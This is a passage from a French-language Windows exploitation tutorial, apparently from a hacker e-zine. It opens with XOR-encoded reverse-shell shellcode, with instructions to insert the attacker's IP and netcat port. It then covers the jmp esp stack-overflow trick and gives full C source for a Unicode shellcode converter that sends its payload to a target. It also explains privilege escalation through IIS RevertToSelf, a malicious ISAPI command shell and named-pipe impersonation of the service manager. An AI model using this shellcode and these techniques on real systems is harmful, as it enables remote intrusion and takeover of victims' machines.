+"\x99\xDF\x99\x54\x36\x11\xD1\xC3\xF3\x11\xD3\x21\xDB\x74\x99\x1A\x99\x54\x0E\x11\xD1\xD3\xF3\x10\x11"
+"\xD3\x99\x12\x11\xD1\x99\xE0\x99\xEC\x99\xC2\xAB\x19\x12\x12\x12\xFA\x6A\x13\x12\x12\x21\xD2\xBE\x97"
+"\xD2\x67\xEB\x40\x44\xED\x45\xC6\x48\x99\xCA\xAB\x14\x12\x12\x12\xFA\x4D\x13\x12\x12\xD5\x55\x76\x1E"
+"\x12\x12\x12\xD5\x55\x7A\x12\x12\x12\x12\xD5\x55\x7E\x13\x12\x12\x12\x78\x12\x9F\x55\x76\x42\x9F\x55"
+"\x02\x42\x9F\x55\x06\x42\xED\x45\xD2\x78\x12\x9F\x55\x76\x42\x9F\x55\x0A\x42\x9F\x55\x0E\x42\xED\x45"
+"\xD2\xD5\x55\x32\x56\x12\x12\x12\x9F\x55\x32\x42\xED\x45\xD6\x99\x55\x02\x9B\x55\x4E\x9B\x55\x72\x99"
+"\x55\x0E\x9B\x55\x4A\x93\x5D\x5E\x13\x13\x12\x12\x74\xD5\x55\x42\x12\x12\x9F\x55\x62\x42\x9F\x55\x32"
+"\x42\x21\xD2\x42\x42\x42\x78\x13\x42\x42\xFA\x12\x12\x12\x12\x4F\x93\xFF\x2E\xEC\xED\xED\x47\x42\xED"
+"\x45\xDA\xED\x65\x02\xED\x45\xF6\xED\x65\x0E\xED\x45\xF6\x7A\x12\x16\x12\x12\x78\x52\xED\x45\xC2\x99"
+"\xFA\x42\x7A\x13\x13\x12\x12\xED\x45\xFA\x97\xD2\x1D\x97\xBC\x12\x12\x12\x21\xD2\x42\x52\x42\x52\x42"
+"\xED\x45\xFE\x2F\xED\x12\x12\x12\x1D\x96\x8B\x12\x12\x12\x99\xCA\x74\xD5\x15\x10\x12\x74\xD5\x55\x10"
+"\xA9\xA9\xD5\x55\x16\xB8\xB8\xB8\xB8\x78\x02\x9F\x15\x42\x41\xED\x45\xE6\x78\x20\xED\x45\xCE\x21\xDB"
+"\x43\x44\x43\x43\x43\xED\x65\x06\xED\x45\xDE\x97\xD2\x66\x70\x82\x82\x82\x82\x92\x2C\x12\x66\x23\x82"
+"\x82\x82\x82\x78\x12\x44\x7A\x12\x16\x12\x12\x47\xED\x65\x06\xED\x45\xCA\x97\xD2\x66\x50\x82\x82\x82"
+"\x82\x78\x12\xED\x24\x47\x41\xED\x45\xEA\x2F\xED\x12\x12\x12\x66\x3C\x82\x82\x82\x82\xF9\xA2\x78\x12"
+"\x7A\x12\x16\x12\x12\x47\x41\xED\x45\xEE\x97\xD2\x6E\x0A\x82\x82\x82\x82\x66\x88\x78\x12\x44\x42\x47"
+"\xED\x65\x0A\xED\x45\xC6\x78\x20\xED\x45\xCE\xF9\x9A\x41\xED\x45\xE2\x78\x12\xED\x45\xF2\x21\xD2\xBE"
+"\x97\xD2\x67\xEB\x43\x40\x44\x41\xED\xC0\x48\x4B\xB9\xF0\xFC\xD1\x55\x77\x66\x42\x60\x7D\x71\x53\x76"
+"\x76\x60\x77\x61\x61\x12\x5E\x7D\x73\x76\x5E\x7B\x70\x60\x73\x60\x6B\x53\x12\x51\x60\x77\x73\x66\x77"
+"\x42\x7B\x62\x77\x12\x55\x77\x66\x41\x66\x73\x60\x66\x67\x62\x5B\x7C\x74\x7D\x53\x12\x51\x60\x77\x73"
+"\x66\x77\x42\x60\x7D\x71\x77\x61\x61\x53\x12\x42\x77\x77\x79\x5C\x73\x7F\x77\x76\x42\x7B\x62\x77\x12"
+"\x55\x7E\x7D\x70\x73\x7E\x53\x7E\x7E\x7D\x71\x12\x45\x60\x7B\x66\x77\x54\x7B\x7E\x77\x12\x40\x77\x73"
+"\x76\x54\x7B\x7E\x77\x12\x41\x7E\x77\x77\x62\x12\x57\x6A\x7B\x66\x42\x60\x7D\x71\x77\x61\x61\x12\x51"
+"\x7E\x7D\x61\x77\x5A\x73\x7C\x76\x7E\x77\x12\x45\x41\x5D\x51\x59\x21\x20\x12\x45\x41\x53\x41\x66\x73"
+"\x60\x66\x67\x62\x12\x61\x7D\x71\x79\x77\x66\x12\x71\x7E\x7D\x61\x77\x61\x7D\x71\x79\x77\x66\x12\x71"
+"\x7D\x7C\x7C\x77\x71\x66\x12\x61\x77\x7C\x76\x12\x60\x77\x71\x64\x12\x71\x7F\x76\x3C\x77\x6A\x77\x12";
+<-X->
+
+N.B.
+ A la place de la séquence \xB8\xB8\xB8\xB8 vous devrez y mettre votre
+ adresse IP XORée avec 0x12 .
+ A la place de la séquence \xA9\xA9 vous devrez y mettre la porte sur
+ laquelle vous avez placé netcat en écoute, XORée avec 0x12 .
+ L'adresse et la porte NE doivent PAS avoir l'ordre des byte invertit.
+
+N.B.2
+ La première ligne est la XOR patch, tout le reste est le shellcode XORé.
+
+N.B.3
+ Evidemment le code peut étre beaucoup optimisé si vous avez des problèmes
+ à cause de la taille.
+
+ERRATA CORRIGE:
+La méthode des Pipe est employée dans le shellcode parceque les fonctions de
+I/O que cmd.exe utilise font échec si le descripteur utilisé est une socket.
+Celui ci dépend de comment est géré l'I/O de la socket (example: overlapped,
+blocking, etc), de façon différente de ce que s'attend cmd.exe .
+Cependant c'est possible appeler WSASocket() pour créer des socket qui ne 
+soient pas du genre overlapped:
+sd = WSASocket (AF_INET, SOCK_STREAM, 0, 0, 0, 0);
+Les descripteurs des socket créés comme ça peuvent être passés directement au
+processus fils (cmd.exe) comme stdin, stderr et stdout à l'intérieur de la 
+structure STARTUPINFO, comme nous avons vu auparavant pour les Pipe. De cette 
+façon nous aurions pas besoin d'utiliser les pipe, mais nous ferons communiquer
+l'attaquant directement avec l'interprète des commandes, justement comme nous
+aurions fait dans le cas d'un système Unix, le tout pour avantager les 
+dimensions du code. Cette technique a seulement un petit inconvénient: si le 
+processus fils (cmd.exe) reste bloqué pour quelque raison, le père (le 
+processus où marche le shellcode) ne peut pas s'en rendre conte et il risque de
+rester bloqué lui aussi. Comme déjà précisé par les gars de LSD, ceci peut 
+représenter un problème dans le cas d'exploit très particulier, où une seule
+connection peut être établie avec le server vulnérable.
+Tous cela vaut pour les shellcode qui "appèlent" an arrière l'attaquant. Si
+nous avons besoin de re-utiliser une socket déjà ouverte pour communiquer avec
+le shellcode (à cause par example de règles de firewall très rigides), le 
+succès ou l'échec de cette technique dépend de comment le programme vulnérable 
+a ouvert la socket que nous voulons re-utiliser. Par example, de default, une 
+socket ouverte avec socket() n'ira pas bien pour nos propos (par example, 
+apparament, après l'avoir ouverte c'est pas possible modifier l'overlap d'une 
+socket) et nous devrons sur la fin utiliser la métode des pipe.
+(Merci à xeon pour l'observation)
+
+
+
+//////////////////////
+// 2- JMP ESP TRICK //
+//////////////////////
+
+Comme nous avons vu avant, la position des DLL mapped en mémoire est plus ou
+moin prévisible. Si il faut exploiter un normal stack overflow, ce fait peut
+étre utilisé à notre avantage.
+Voyons comment...
+
+Un des gros problèmes quand il s'agit d'exploiter un stack overflow c'est
+qu'il faut re-écrire un RET-ADDR et le faire pointer à notre code.
+Très probablement, même notre code se trouvera sur le stack, dans une position
+difficilement prévisible à priori.
+Une des façon plus utilisé pour éviter ce problème c'est faire précéder notre
+shellcode par un série de NOP, de façon à nous permettre une marge de sécurité
+pour faire "attérir" l'exécution du programme dans notre code.
+
+Içi nous proposons une solution alternative et, dans quelque cas, beaucoup
+plus précise.
+Cette solution est aussi celle adopté par le worm slammer, et en partie c'est
+aussi grace à lui (ou de sa faute?) s'il est autant letal.
+
+Si vous y pensez, c'est beaucoup plus facile savoir (à priori) le placement
+que RET-ADDR re-écrit a à partir du début du buffer que nous utilisons, plutot
+que sa position absolue.
+Dans une situation du genre nous réussirons à re-écrire le RET-ADDR avec
+précision et à placer IMMEDIATEMENT APRES lui notre shellcode.
+A la place de re-écrire RET-ADDR avec l'adresse absolue où commence
+le code (difficilemente prévisible), nous le re-écrivons avec une adresse
+de mémoire où se trouve les deux byte "FF E4".
+Pour avoir une adresse prévisible où se trouvent les deux byte d'avant il
+suffit de faire un tour dans les DLL plus linkées par les programmes (par
+example NTDLL.DLL).
+Comme nous avons vu, ces DLL se trouvent dans des zones de mémoire prévisibles
+et donc même leur segment de code contenant les byte "FF E4".
+
+Mais qu'est ce que ces deux byte représentent?
+Ces byte sont l'opcode de "jump esp".
+Quand la fonction exploité exécutera le "ret", ESP pointera exactement après
+le RET-ADDR re-écrit (et donc à notre code).
+La fonction retournera sur l'opcode "jump esp" qui ne fera rien d'autre que
+sauter à notre shellcode!!!
+
+N.B.
+ Si la fonction exploité utilise un "ret" avec un déplacement nous devrons que
+ déplacer notre shellcode après le RET-ADDR d'autant de byte que combien en a
+ le déplacement.
+
+
+
+//////////////////////////////////////////////
+// 3- UNICODE SHELLCODE CONVERTER (n0stack) //
+//////////////////////////////////////////////
+
+Vu que nous somme dans le monde Windows, il est possible que notre shellcode
+envoyé dans une "demande malicieuse" reçoit une expansion en Unicode avant
+de finir dans le buffer qui sbufferera (permettez-moi l'expression).
+
+L'expansion d'un texte ASCII en format unicode se produit simplement en
+intervallant des 0x00 entre un byte est l'autre.
+
+Meme un enfant, à cet point, comprendrait qu'un normal shellcode, après
+étre intervallé avec des 0x00, perd son sens.
+
+Supposons en outre que le programme que nous voulons exploiter n'accepte
+pas des morceaux de texte déjà codifiés en Unicode (ou alors on pourrait lui
+fournir le shellcode directement en Unicode tandis qu'en ASCII, plus ou
+moin comme il fait CodeRed).
+
+Comme les gars de eEye ont déjà focalisés les chemins possibles sont:
+
+1) Ecrire un shellcode "custom" qui ait du sens après étre "farçi" avec les
+   0x00 .
+2) Créer une sorte de traducteur qui transforme n'importe quel shellcode en
+   un équivalent qui ait du sens après étre étendu en Unicode.
+   Ce shellcode devrait s'occuper de reconstruire de quelque façon le
+   shellcode original et, en suite, transférir le controle a lui.
+
+N.B.
+En suite nous ferons référence à la IA386.
+L'example fourni, comme vous pouvez intuir du shellcode présent, a été écrit
+sur un Linux pour exploiter un autre Linux.
+La tecnique est cependant applicable à n'importe quel système opératif.
+Nous prendrons pas en considération l'hypothèse que le programme vulnérable
+ait quelque sorte de "high bit filter".
+
+La technique décrite içi je l'avait dans le tiroir depuit quelques temps.
+La décision de la rendre pubblique est arrivé après avoir lu un paper sur
+le suject, écrit par Chris Anley.
+Dans ce paper ( http://www.nextgenss.com/papers/unicodebo.pdf ) elle est
+décrit une technique pour écrire des shellcode générique "expansible" en
+Unicode.
+Cette technique, qu'ils ont appelés "Venetian Exploit", permet de "traduire"
+un shellcode générique en sont équivalent expansible.
+
+Le point de force de cette technique est qu'elle permet de produire
+shellcode relativement petit (original_size*7), mais elle a un ENORME
+désavantage:
+le shellcode n'est absolument pas relocalisable (il doit contenir une
+référence absolue à l'intérieur de son buffer).
+
+La technique détaillée içi (que j'ai appelé "n0stack") crée un shellcode
+plus grand (à peut près 3 fois plus grand que ceux créés avec la technique
+"venetian"), mais totalement relocalisable.
+Et donc, si dans votre cas les dimensions ne sont pas un problème, je crois
+que cette technique soit absolument préférable.
+
+Le truc consiste à reconstruire le shellcode original sur le stack et puis
+sauter à lui.
+L'écriture du shellcode sur le stack se passe grace à des opcodes qui ont du
+sens après étre étendus avec les \x00 .
+
+Voici le code:
+
+<-| awex/n0stack.c |->
+/***********************************
+  n0stack-code-generator by NaGA
+************************************/
+
+#include <malicious_query.h> // :P
+#include <unistd.h>
+
+// ADD [ESI],AL si il commence par 0
+//#define PADDING 0x06  // EDX 0x0A  EBX 0x13 EDI 0x17
+
+// JMP 0 si il commence avec un byte non nul------------
+#define PADDING 0xEB
+
+// ADD [EBP+0], DL
+#define SKIP     0x55
+
+#define PUSH_ESP 0x54
+#define PUSH_EAX 0x50
+#define RET      0xC3
+#define MOV_EAX  0xB8
+#define INC_ESP  0x44
+
+// nombre de nop -------------------------
+#define PAD_LEN 12
+
+char buffer[20000];
+
+// Met içi ton shellcode préféré
+char shellcode[]=
+          "\x29\xC0"                /* subl %eax, %eax       */
+          "\x50"                    /* pushl %eax            */
+          "\x68\x2F\x2F\x73\x68"    /* pushl $0x68732f2f     */
+          "\x68\x2F\x62\x69\x6E"    /* pushl $0x6e69622f     */
+          "\x89\xE3"                /* movl %esp, %ebx       */
+          "\x50"                    /* pushl %eax            */
+          "\x89\xE2"                /* movl %esp, %edx       */
+          "\x54"                    /* pushl %esp            */
+          "\x89\xE1"                /* movl %esp, %ecx       */
+          "\xB0\x0B"                /* movb $0x0b, %al       */
+          "\xCD\x80"                /* int $0x80             */
+          "\x69\x69\x69";           /* pour padding          */
+
+int main()
+{
+    int index, shell_index=0;
+
+    for (index=0; index<PAD_LEN; index++)
+	buffer[index]=PADDING;
+
+    shell_index=sizeof(shellcode);
+
+    for(shell_index-=2; shell_index>=0; shell_index--)
+    {
+    	buffer[index++]=MOV_EAX;
+	buffer[index++]=PADDING;
+	buffer[index++]=shellcode[shell_index];
+
+	buffer[index++]=SKIP;
+	buffer[index++]=PUSH_EAX;
+	buffer[index++]=SKIP;
+
+	if (shell_index>0 && shellcode[shell_index-1]==0) // ça permet les \x00
+	    shell_index--;
+	else
+	{
+	    buffer[index++]=INC_ESP;
+	    buffer[index++]=SKIP;
+	}
+	buffer[index++]=INC_ESP;
+	buffer[index++]=SKIP;
+	buffer[index++]=INC_ESP;
+	buffer[index++]=SKIP;
+    }
+
+    buffer[index++]=PUSH_ESP;
+    buffer[index++]=SKIP;
+    buffer[index++]=RET; // à présent nous avons dans buffer[]
+                         // notre shellcode "traduit"
+
+    // Maitenant que nous avons le shellcode traduit dans buffer[]
+    // nous pouvons l'imprimer, le sauvergarder dans un file, ou bien
+    // l'envoyer directement au service que nous voulons exploiter
+
+    do_malicious_query(buffer);
+}
+<-X->
+
+Mais comment ça marche?
+L'idée est simple.
+Le shellcode traduit ne fait rien d'autre que:
+
+1) Prendre byte après byte du shellcode original (en partant par le dernier).
+2) Mettre chaque byte en eax et le pusher sur le stack.
+3) Incrémenter de 3 le stack pointer pour "effacer" les 3 byte en trop.
+4) Tout répéter jusqu'il n'ait pas re-écrit entièrement le shellcode original
+   dans le stack.
+5) Sauter au shellcode avec un simple
+      push esp
+      ret
+
+Voyons quelles instructions nous avons utilisé pour faire cela:
+
+- push esp
+- push eax
+- ret
+- inc esp
+- mov eax, SHCODE_BYTE
+
+Les 4 premières instructions ont un opcode de un byte.
+La dernière a la forme 0xB8 0x00 0xSomething 0x00 0xSHCODE_BYTE .
+
+Pour de question d'alignement nous devrons insérer, entre une instruction et
+une autre, une commande qui ait un opcode du genre 0x00 0xbb 0x00 qui ne fasse
+rien. L'instruction en question est
+ add [ebp+0], dl = 0x00 0x55 0x00
+et je donne pour acqui que ebp pointe quelque part plausible qui n'influence
+pas notre code (dans le cas, il suffit quelques petites modifications pour le
+faire pointer dans une zone "sûre").
+
+A la place des NOP nous utilisons des
+ jmp 0 = 0xEB 0x00
+ou des
+ add [esi/edx/ebx/edi], al = 0x00 0x06/0x0A/0x13/0x17
+
+N.B.
+ Le shellcode à traduire pourra contenir même des 0x00 (il suffit incrementer
+ esp de 2 tandit que de 3).
+ Ceci veut dire que même le shellcode vu auparavant peut être élaborer par le
+ "converter" sans avoir besoin de la XOR-patch.
+
+Si vous avez encore les idées confuses, je vous assure que 10 minutes de
+debugger vous enlevera tous vos doutes.
+
+
+
+/////////////////////////////////////////////////////////////
+// 4- INTRODUCTION AUX PRIVILEGES ET AU CONTROLE DES ACCES //
+/////////////////////////////////////////////////////////////
+
+Avant de continuer avec l'exposition de quelques autres "tricks" possibles sous
+Windows, nous voulons présenter une introduction aux méchanismes et aux
+structures avec lequels ce système opératif gestit le méchanisme des privilèges
+et du contrôle des accès.
+
+--- ACCESS CONTROL ---
+
+Le processus de LogOn à un système Windows NT/2000 commence avec la
+présentation au système de références formées par le couple username et
+password.
+Après avoir donnée ces références, le système les compare avec celles contenus
+dans son database et, si elles sont valides, crée une structure de données pour
+l'usager qui s'appele Access Token.
+Chaque processus exécuté par l'usager a une copie de cet Access Token.
+
+Le Token contient principalement:
+
+- Une série de Security Identifiers (SIDs) qui identifient le user account et
+  tous les groupes auquels l'utilisateur appartien. Ce sont des numéros
+  uniques, de longueur variable, émit par une Authority (par example un Domaine
+  Windows 2000/NT) et mémorisés dans un database pour le controle des
+  références.
+
+- Une liste des privilèges associés au user ou au groupe d'appartenance:
+
+    SE_DEBUG_NAME             : Permet de debugger n'importe quel processus
+    SE_ENABLE_DELEGATION_NAME : Permet d'identifier une entité trusted pour la
+    				SecurityDelegation (nous verrons en suite
+				qu'est-ce que c'est)
+    SE_SECURITY_NAME          : Identifit le possesseur comme SecurityOperator
+    SE_SHUTDOWN_NAME          : Permet d'effectuer le shutdown de la machine
+                                en local
+    SE_TCB_NAME               : Identifit le possesseur comme partie du
+                                système opératif (nous verrons en suite comment
+				l'utiliser)
+    SE_BACKUP_NAME            : Permet d'effectuer des opérations de BackUp
+    SE_TAKE_OWNERSHIP_NAME    : Permet d'obtenir la ownership d'un objet
+                                même si ont a pas les droits d'accès sur lui
+    SE_AUDIT_NAME             : Permet de générer un événement de audit
+    SE_LOAD_DRIVER_NAME       : Permet de charger un device driver
+    SE_CREATE_TOKEN_NAME      : Permet de créer un objet Token
+    Etc.
+
+Le système utilise les Token et les informations contenues dans ceux ci pour
+identifier l'usager associé quand il tente d'accéder à un Securable Object ou
+il tente d'exécuter un Task administratif.
+
+Par Securable Object nous entendons un vaste ensemble d'objet Win32 qui peuvent
+être des simples files, comme documents ou exécutable, ou bien des Handle à
+objets, processus ou Thread.
+Quand un Securable Object est créé, le système opératif lui assigne un
+Security Descriptor qui contient un ensemble d'information de sécurité attribué
+à l'objet par son créateur.
+Ces informations sont utilisées par le systéme opèratif pour controller tous
+les accès à l'objet même.
+
+Un Security Descriptor contient en plus:
+
+- Un identificateur du propriétaire de l'objet.
+- Deux structures du type Access Control List (ACL).
+
+Chaque ACL est composée d'une liste d'objets appelés Access Control Entry
+(ACE).
+Chaque ACE identifit, à travers un SID, un user account et un group account
+(appelé trustee), en specifiant les droits d'accès à l'objet pour ce trustee.
+L'ACE contient aussi un flag qui en marque le type et un ensemble de bitfield
+qui en indiquent le type d'hérédité.
+
+Il y a deux ACL pour chaque Security Descriptor:
+
+- Une Discretionary Access-Control List (DACL) qui identifit les usagers ou
+  les groupes auquels l'accès à l'objet est permis ou nié.
+- Une System Access-Control List (SACL) qui spécifit comment le sytème doit
+  se souvenir des tentatifs d'accès à l'objet. Dans ce cas, chaque ACE
+  spécifit le type d'accès, de la part d'un trustee, qui doit écrit dans un
+  log par le système.
+
+Quand un thread ou un processus tentent d'accéder à un Securable Objects, le
+système exécute un controle d'accès avant tout. Ce controle est effectué avec
+une scansion de la DACL de l'objet et en cherchant une ACE qui s'applique à
+l'user SID ou aux group SIDs contenus dans l'Access Token de l'entité qui
+réclame l'accès.
+
+Dans le cas où l'objet n'ait pas une DACL, le système garantit l'accès à
+n'importe qui (groupe Everyone).
+Par contre, dans le cas où la DACL n'ait pas ACE, l'accès à l'objet est nié
+à tous.
+
+N.B.
+Si le Security Descriptor ne contient pas une DACL, une Null DACL est creé.
+Une Null DACL ne devrait pas être confondu avec une Empty DACL.
+Une Empty DACL c'est une DACL creée et initialisée, mais qui ne contient
+aucune ACE. Une Empty DACL ne permet pas l'accès à l'objet à personne, tandis
+que une Null DACL garantit l'accès à l'objet à tout le monde.
+
+Allons voir en détail comment est fait un Access Token.
+
+--- ACCESS TOKENS ---
+
+Comme dit auparavant, un Access Token est un objet qui décrit le Security
+Context d'un processus ou d'un thread, à travers l'identité et les privilèges
+attribués à l'usager propriétaire de ce processus ou de ce thread.
+
+Un Access Token contient ces informations:
+
+- Le security identifier (SID) du User Account.
+- SIDs pour les groupes auquel appartient l'usager.
+- Un LogOn SID qui identifit la Logon Session actuelle.
+- Une liste de Privileges attruibués au user et au groups.
+- Un owner SID.
+- Le SID pour le Primary Group.
+- La default DACL qui est utilisée par le sytème quand l'usager crée un objet
+  sans spécifier un Security Descriptor.
+- La source de l'access token.
+- Si un token est un Primary Token ou un Impersonation token.
+- Une liste optionelle de restricting SIDs.
+- Le niveau actuel de Impersonation.
+- Autre statistiques.
+
+Une précisation doit encore être faite sur la typologie de Token. Chaque
+processus possède un Primary Token qui décrit le Security Context de l'usager
+propriétaire du Thread.
+D'abitude le sytème utilise le Token primaire quand le processus tente
+d'accéder à un objet.
+Cependant, à un thread il est permis de personnifier un Security Context
+différent du sien.
+Par example, dans le cas d'une architecture client-server, le Thread server
+peut personnifier le Security Context du client (pour exécuter par example le
+dropping des privilèges).
+Dans ce cas, le Thread qui personnifit un client a un Primary Token et aussi un
+Impersonation Token.
+
+Windows offre plusieurs fonctions pour permettre à un thread de personnifier un
+SecurityContext différent du sien:
+
+- DdeImpersonateClient       : Personnifit le client d'un server DDE
+- ImpersonateNamedPipeClient : Personnifit le client d'une NamedPipe (nous
+			       allons voir en suite comment c'est possible
+			       l'utiliser).
+- ImpersonateLoggedOnUser    : Personnifit un usager entré dans le système à
+                               travers son Token.
+- RpcImpersonateClient       : Personnifit le client d'un server RPC.
+- ImpersonateSelf            : Le processus qui l'appèle personnifit soi même
+			       en spécifiant un niveau de personnification
+                               (nous le verrons après).
+- etc.
+
+En plus, si un client s'authentifit directement à un processus server (en
+fournissant par example username et password), celui-ci peut utiliser les
+références obtenues pour exécuter la fonction LogonUser.
+LogonUser retourne un Token qui représente localement le SecurityContext, dans
+ce cas, de l'usager client; il peut être utilisé par le server pour le
+personnifier (par example avec ImpersonateLoggedOnUser) et faire des opérations
+avec ses privilèges.
+
+Comme nous verrons mieux plus tard, le type de Token peut changer selon la
+métode de LogOn utilisée.
+Par example, si le server utilise un type de logon LOGON32_LOGON_NETWORK pour
+personnifier un usager, il lui sera assigné un Impersonation Token, et les
+références fournits par l'usager (username, password hashes, etc) ne serons
+pas mémorisées dans sa session de logon. Celui-ci, comme nous verrons après,
+limitera le champ d'action du server qui effectu l'Impersonation e, évidemment,
+d'un attaquant qui cherche à l'exploiter.
+
+Vice-versa, avec LOGON32_LOGON_INTERACTIVE, une session de logon complête sera
+créé.
+L'usager doit quand-même avoir les privilèges nécessaire pour pouvoir effectuer
+les différents types de logon. Par example pour un logon interactif l'usager
+doit avoir le privilège SE_INTERACTIVE_LOGON_NAME .
+
+Ils existent sept différents types de logon possible sous windows.
+
+Ils y sont aussi des fonctions, comme DuplicateTokenEx, qui permettent de
+transformer un Impersonation Token en un Primary Token.
+Un Token primaire est nécessaire par example si nous voulons utiliser la
+fonction CreateProcessAsUser comme nous verrons en suite.
+
+Ils y sont différents types possibles de personnification qui specifient
+combien elle soit effective cette personnification:
+
+- SecurityAnonymous      : Le processus server n'obtient aucune information de
+                           la part du client.
+- SecurityIdentification : Le processus server peut obtenir quelques
+                           informations sur le client (comme les SID et les
+			   privilèges), mais il ne peut pas le personnifier.
+- SecurityImpersonation  : Le server peut personnifier le client sur le système
+                           local.
+- SecurityDelegation     : Le server peut personnifier le SecurityContext du
+                           client même sur des sytèmes à distance.
+
+Quand un Thread veut terminer le processus de personnification, il pourra
+utiliser plusieurs fonctions comme RevertToSelf et RPCRevertToSelf, pour
+re-acquérir les privilèges contenus dans son Token d'origine.
+
+Windows NT/Windows 2000 fournit un méchanisme de sécurité qui rend possible
+controller l'accès à un Access Token comme il arrive pour tout autre objet.
+Quand un utilisateur tente d'accéder à un token en utilisant les normales API
+Windows, le système controle les droits d'accès nécessares dans la DACL du
+Security Descriptor de l'Access Token.
+Si l'usager a les privilèges nécessaires pour effectuer l'opération sur le
+Token, alors le système en garantit l'accès.
+
+
+
+///////////////////////////////////////
+// 5- SHELLCODE PRIVILEGE ESCALATION //
+///////////////////////////////////////
+
+Comme nous avons vu auparavant il est possible que le service que nous allons
+exploiter ait "droppé" ces privilèges avant de gérer notre demande
+"malicieuse".
+Dans quelque cas il est possible re-obtenir les privilèges originaires du
+service (que dans la plupart des cas marchera comme LOCAL_SYSTEM) en utilisant
+justement le système de personnification utilisé par Windows.
+
+Nous prenons un example pratique: Internet Information Server
+(va savoir pourquoi juste ça!).
+
+Quand il est installé, IIS crée deux usagers avec bas privilèges appelés
+IUSR_<nom_machine> et IWAM_<nom_machine> .
+Quand IIS doit gérer une demande de la part d'un client non authorisé, il entre
+dans le système comme un utilisateur à bas privilège et il le personnifit pour
+tout le temps de gestion de la demande.
+
+La personnification varie selon la resource qui est demander.
+IIS distingue par example les ISAPI qui sont lancé InProcess (à l'intérieur du
+processus même) et celle OutProcess (dans un processus séparé).
+Dans le premier cas IIS personnifiera l'usager IUSR_<nom_machine> pour gérer
+la demande.
+Dans le deuxième cas IIS lancera un processus séparé sous le SecurityContext de
+IWAM_<nom_machine> .
+
+Si nous voulons exploiter une ISAPI qui marche InProcess, nous aurons la
+possibilité d'utiliser dans notre shellcode, avant de lancer notre "cmd.exe",
+la fonction RevertToSelf, pour terminer la personnification de IUSR et
+re-obtenir les privilèges originaire de IIS (!!!).
+
+Petite remarque:
+IIS distingue les ISAPI InProcess de celles OutProcess à travers un "metabase"
+où sont enregistrés, entre autres, toutes les ISAPI que IIS reconnait.
+Mais dans certaines versions, ces ISAPI sont identifiées uniquement à travers
+leur nom et non pas avec le path complet. Si nous réussisons à uploader dans
+une directory quelconque de la machine avec permis d'exécution (en utilisant
+par example le vieux bug du directory traversal) une ISAPI construite par nous,
+nous pourrons alors l'appeler comme une des ISAPI que IIS fait marcher comme
+InProcess (par example idq.dll ).
+
+Immaginez que cette ISAPI soit contruite pour appeler la fonction RevertToSelf,
+exécuter une commande (cablé par example dans la demande même) et mettre dans
+une page html l'output de la commande.
+En appelant à travers notre browser l'ISAPI, avec le path où nous l'avons
+installé, nous avons une shell rudimentaire avec privilèges administratifs!!!!
+
+
+
+///////////////////////////////////////////////
+// 6- ENCORE SUR L'ESCALATION DES PRIVILEGES //
+///////////////////////////////////////////////
+
+Comme nous avons vu dans le paragraphe précédent il est possible utiliser la
+fonction RevertToSelf pour opérer une escalation des privilèges d'un processus
+qui les avait droppés.
+En général, toutes les fonctions de personnification peuvent être très utiles,
+mais elles sont aussi très dangeureuses si les processus qui marche avec des
+privilèges élevés n'en font pas un emploi consciencieux.
+Le système de gestion de la personnification introduit en Windows toute une
+série de problématique de sécurité pas présent sous d'autres systèmes
+opératifs.
+
+Nous allons voir un example pratique de programme qui, lancé localement avec
+bas privilèges, reussit à obtenir les privilèges de LOCAL_SYSTEM en se servant
+de fonctions de personnification et un petit bug de certaines versions de
+Windows2000 (qui manque de ServicePack).
+L'auteur de cet exploit est Maceo. Nous ne reportons pas le code vu que vous
+pouvez facilement le trouver sur le Réseau.
+
+Le Service Control Manager (SCM) est l'entité que Windows utilise pour la
+gestion de ses services. Chaque fois que un service est exécuté, SCM crée une
+NamedPipe auquel le service à peine parti se connectera.
+De cette façon SCM et le service pourrons "dialoguer" avec une simple
+architecture client/server.
+Le nom des pipe utilisés par SCM a la forme "\\.\pipe\net\NtControlPipe" suivit
+par un ordinal qui distingue une pipe d'une autre.
+
+Dans le registry elle est présente une clef, lisible par tous, qui représente
+l'ordinal de la dernière pipe ouverte par SCM:
+
+HKEY_LOCAL_MACHINE\Sysetm\CurrentControlSet\Control\ServiceCurrent
+
+Le numéro de cette clef est incrémenté chaque fois qu'un service est exécuté.
+
+Le code malicieux ne fait rien d'autre que lire cette clef du registre et créer
+une NamedPipe .
+Cette NamedPipe devra s'appeler comme la prochaine pipe que SCM cherchera
+d'utiliser quand un nouveau service sera lancé.
+A présent notre code dira à SCM d'exécuter un nouveau service qui tourne avec
+des privilèges élevés (LOCAL_SYSTEM).
+Ils y sont plusieurs services (par example ClipBook) qui marche avec les
+privilèges de LOCAL_SYSTEM et peuvent être exécutés par n'importe quel usager
+interactif.
+
+Maintenant SCM ne pourra pas ouvrir la pipe vu que une pipe avec ce nom a déjà
+été ouverte par notre code, mais le service à peine exécuté pourra s'y
+connecter.
+
+Dans cette situation notre code serait le server-end de la NamedPipe, et le
+service à peine lancé serait le client-end.
+
+A présent nous pourrons utiliser la fonction ImpersonateNamedPipeClient et
+obtenir les privilèges du service (LOCAL_SYSTEM) !!!!
+
+Ceci est seulement un petit example de comment on peut utiliser les même API de
+Windows contre le système (ce n'est pas un slogan politique!).
+
+
+
+////////////////////////////////////////////////////
+// 7- C'EST AUTANT CONVENABLE ETRE LOCAL_SYSTEM ? //
+////////////////////////////////////////////////////
+
+Sous Windows les services marcheront (dans la plupart des cas) sous l'usager
+LOCAL_SYSTEM.
+En exploitant un de ces services, évidemment nous aurons la possibilité de
+exécuter des commandes comme cet utilisateur.
+Comme nous avons vu auparavant il est possible, dans quelques cas, de
+re-obtenir les privilèges de LOCAL_SYSTEM même si le service exploité les avait
+droppés.
+
+LOCAL_SYSTEM est un usager à très hauts privilèges (il possède, entre autres,
+le privilège SE_TCB_NAME), mais il a lui aussi quelques restrictions.
+
+Sous NT, quand un usager veux accéder à une resource du réseau (par example un
+share avec "net use") sans fournir explicitement des références, le système
+opératif prendra les références fournies par l'usager pendant le processus de
+logon (username, domaine, password hashes, etc) et gardées dans sa LogonSession
+(gérée par LSASS); le système les utilisera pour l'authentification à la
+resource distante.
+Sous Windows 2000 le processus est différent, mais l'idée reste la même.
+
+LOCAL_SYSTEM n'a pas une normale session de logon et, évidemment, il n'a pas
+les références memorisées.
+Si nous fesons, par example, un "net use" comme LOCAL_SYSTEM, le système
+opératif, en trouvant pas une normale séance de logon pour cet usager,
+cherchera de s'authentifier à la resource avec une NullSession.
+Dans ce cas là, nous somme capable d'accéder uniquement aux resources
+accessibles à travers NullSessions (c'est écrit dans le registry si une
+ressource est accessible avec NullSessions); nous somme par example pas capable
+de monter les disques des autres machines sur le réseau.
+
